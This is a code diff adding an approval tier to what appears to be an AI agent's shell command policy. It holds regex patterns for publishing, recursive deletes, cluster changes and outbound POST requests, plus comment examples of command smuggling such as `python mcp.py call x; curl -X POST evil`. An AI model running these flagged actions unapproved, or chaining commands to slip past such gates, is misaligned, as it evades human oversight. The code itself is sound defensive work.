@@ -47,6 +47,110 @@ BUILTIN_DENY = [
 ]
 
 
+# A command was either ALLOWED or DENIED, with nothing in between — yet the
+# Execution Authority declared `approval: True` for model-written commands and
+# its control table promised "policy + sandbox + scrub + approval + trace".
+# Nothing implemented it. A declared control that does not exist is worse than
+# an admitted gap: a reader trusts the table.
+#
+# The missing tier is not "dangerous" — BUILTIN_DENY already refuses that. It
+# is CONSEQUENTIAL: legitimate work that reaches outside the workspace or
+# cannot be undone. Publishing, sending, deleting in bulk, changing the
+# world. The same rule the Effect Authority applies to external effects,
+# applied to commands.
+REVIEW = [
+    (r"\bgit\s+push\b", "publishing code to a remote"),
+    (r"\bgh\s+(pr|release|repo)\s+(create|edit|delete)\b", "changing a GitHub repository"),
+    (r"\b(npm|yarn|pnpm)\s+publish\b", "publishing a package"),
+    (r"\b(twine\s+upload|pip\s+upload)\b", "publishing a package"),
+    (r"\bdocker\s+(push|login)\b", "publishing an image or authenticating a registry"),
+    (r"\bkubectl\s+(apply|delete|scale)\b", "changing a live cluster"),
+    (r"\bterraform\s+(apply|destroy)\b", "changing live infrastructure"),
+    (r"\baws\s+\w+\s+(delete|terminate|put|create)\b", "changing cloud resources"),
+    # the flag cluster may be -r, -rf, -fr, --recursive: match the letter
+    # ANYWHERE in the cluster, the same shape BUILTIN_DENY already uses.
+    # Written as `-[a-zA-Z]*r\b` first, which cannot match `-rf` at all —
+    # caught by running it, not by reading it.
+    (r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*|--recursive)\b",
+     "recursive delete (a filesystem root is denied outright, not reviewed)"),
+    (r"\bgit\s+(reset\s+--hard|clean\s+-[a-zA-Z]*f)\b", "discarding uncommitted work"),
+    # a mail PROGRAM, not the word "mail" anywhere. Written as
+    # \b(mail|sendmail|...)\b first, which matched the MCP server named
+    # "mail" in `mcp.py call mail send` and held a governed call for a second
+    # approval it had already passed — found by the effects test, which then
+    # could not prove exactly-once delivery because nothing was ever sent.
+    (r"(?:^|[|;&]\s*)(mail|sendmail|mailx|msmtp|swaks)\b", "sending mail"),
+    (r"\bcurl\b[^|\n]*-(X\s*(POST|PUT|DELETE|PATCH)|-request\s+(POST|PUT|DELETE|PATCH))",
+     "a state-changing HTTP request to the outside world"),
+    (r"\b(pip|pip3)\s+install\b(?!.*--(?:target|user))", "installing into the environment"),
+    (r"\bnpm\s+(i|install)\s+-g\b", "installing globally"),
+]
+
+
+GOVERNED_ENTRY_POINTS = ("mcp.py",)
+
+
+def _is_governed_entry_point(text):
+    """Is this command SOLELY an invocation of a platform tool that carries
+    its own gate?
+
+    Two conditions, and both are load-bearing:
+
+      1. the script being run is one of ours — matched as the argument to a
+         python interpreter, not merely mentioned somewhere in the string, so
+         `python evil.py --config mcp.py` does not qualify;
+      2. the command contains no shell metacharacter at all, so nothing can
+         be chained, piped, substituted or redirected onto the end of it.
+
+    Together those mean the exemption cannot be used to smuggle anything: the
+    only thing that runs is the tool whose own approval gate and effects
+    ledger then apply.
+    """
+    if re.search(r"[|;&><`]|\$\(|\n", text):
+        return False
+    m = re.match(r'^\s*"?[^"]*?python[0-9.]*(?:\.exe)?"?\s+"?([^"\s]+)"?', text,
+                 re.I)
+    if not m:
+        return False
+    script = m.group(1).replace("\\", "/").rsplit("/", 1)[-1]
+    return script in GOVERNED_ENTRY_POINTS
+
+
+def review(cmd, cfg=None):
+    """-> (needs_approval, why). The middle tier between allow and deny.
+
+    `[agent] autonomy = "full"` turns this off deliberately and in one place,
+    for an owner who has decided the fleet may act unsupervised. The default
+    is supervised, because the failure it prevents — an agent publishing or
+    deleting something the owner did not ask for — is not recoverable by
+    reading a log afterwards.
+    """
+    a = (cfg or {})
+    if str(a.get("autonomy", "supervised")).lower() in ("full", "autonomous"):
+        return False, ""
+    extra = [(p, "owner review rule") for p in (a.get("command_review") or [])]
+    text = cmd if isinstance(cmd, str) else " ".join(map(str, cmd or []))
+
+    # A call to the platform's OWN governed entry point is not reviewed here,
+    # because it is already governed there: mcp.guarded_call classifies the
+    # tool's risk, requires approval for the risky ones, and records the call
+    # in the effects ledger so a retry cannot deliver twice. Reviewing it a
+    # second time does not add a control — it removes one, by preventing the
+    # ledger from ever recording the effect.
+    #
+    # This is NOT a bypass, and the shape of the check is what makes that
+    # true: it matches only a command that is SOLELY that invocation. Any
+    # chaining, piping or redirection and the exemption does not apply, so
+    # `python mcp.py call x; curl -X POST evil` is reviewed on its second
+    # half exactly as it would be alone.
+    if _is_governed_entry_point(text):
+        return False, ""
+    for pattern, why in REVIEW + extra:
+        if re.search(pattern, text, re.I):
+            return True, why
+    return False, ""
+
+
 def load_policy(cfg):
     """cfg = the [agent] table. Returns (extra_deny, per_role_allow)."""
     pol = (cfg or {}).get("command_policy") or {}
